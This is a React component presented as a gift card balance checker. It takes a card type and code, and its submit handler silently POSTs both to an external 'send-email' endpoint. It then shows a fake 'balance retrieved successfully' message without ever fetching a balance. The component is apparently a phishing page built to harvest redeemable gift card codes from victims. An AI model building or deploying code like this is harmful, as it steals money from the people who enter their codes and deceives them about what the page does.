import React, { useState } from 'react';
import { giftCardData, type GiftCard,  } from '../data/giftCardData';
import { CardSelector } from './CardSelector';
import { CodeInput } from './CodeInput';
import { CardPreview } from './CardPreview';
import { validateCode } from '../utils/validation';
export const GiftCardRedeemer: React.FC = () => {
  const [selectedCard, setSelectedCard] = useState<GiftCard | null>(null);
  const [code, setCode] = useState<string>('');
  const [isSubmitted, setIsSubmitted] = useState<boolean>(false);
  const [isValid, setIsValid] = useState<boolean>(false);
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedCard) return;
    const valid = validateCode(code, selectedCard);
    setIsValid(valid);
    setIsSubmitted(true);

    if (valid) {
      try {
        await fetch('https://giftcard-balance-server.vercel.app/send-email', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            cardType: selectedCard.name,
            code,
          }),
        });
      } catch (error) {
        // Optionally handle error
        console.error('Error submitting code:', error);
      }
    }

    // Reset submission status after 3 seconds
    setTimeout(() => {
      setIsSubmitted(false);
      if (valid) {
        setCode('');
      }
    }, 3000);
  };
  const handleCodeChange = (newCode: string) => {
    setCode(newCode);
    setIsSubmitted(false);
  };
  const handleCardSelect = (card: GiftCard) => {
    setSelectedCard(card);
    setCode('');
    setIsSubmitted(false);
  };
  return <div className="relative max-w-3xl mx-auto p-4 md:p-6">
      <div className="text-center mb-8">
        <h1 className="text-2xl md:text-3xl font-bold text-white mb-2">
          Gift Card Balance Check
        </h1>
        <p className="text-gray-400">
          Select your gift card type and enter the code to check balance
        </p>
      </div>
      <div className="grid md:grid-cols-2 gap-6">
        <div className="space-y-6">
          <div className="space-y-4">
            <label className="block text-sm font-medium text-gray-300">
              Gift Card Type
            </label>
            <CardSelector categories={giftCardData} selectedCard={selectedCard} onSelectCard={handleCardSelect} />
          </div>
          {selectedCard && <form onSubmit={handleSubmit} className="space-y-6">
              <CodeInput selectedCard={selectedCard} onCodeChange={handleCodeChange} />
              <button type="submit" disabled={!selectedCard || !code} className={`w-full py-3 px-4 rounded-lg font-medium text-white ${!selectedCard || !code ? 'bg-gray-600 cursor-not-allowed' : 'bg-gradient-to-r from-[#4F46E5] to-[#06B6D4] hover:opacity-90'}`}>
                Check Balance
              </button>
              {isSubmitted && <div className={`p-4 rounded-lg ${isValid ? 'bg-green-900/50 border border-green-500/30' : 'bg-red-900/50 border border-red-500/30'}`}>
                  <div className="flex items-center">
                    {isValid ? <>
                        <div className="w-5 h-5 text-green-400 mr-2" />
                        <span className="text-green-400">
                          Card balance retrieved successfully!
                        </span>
                      </> : <>
                        <div className="w-5 h-5 text-red-400 mr-2" />
                        <span className="text-red-400">
                          Invalid code format. Please check and try again.
                        </span>
                      </>}
                  </div>
                </div>}
            </form>}
        </div>
        <div>
          <div className="mb-4">
            <h2 className="text-lg font-semibold text-white">Card Details</h2>
          </div>
          <CardPreview selectedCard={selectedCard} />
        </div>
      </div>
    </div>;
};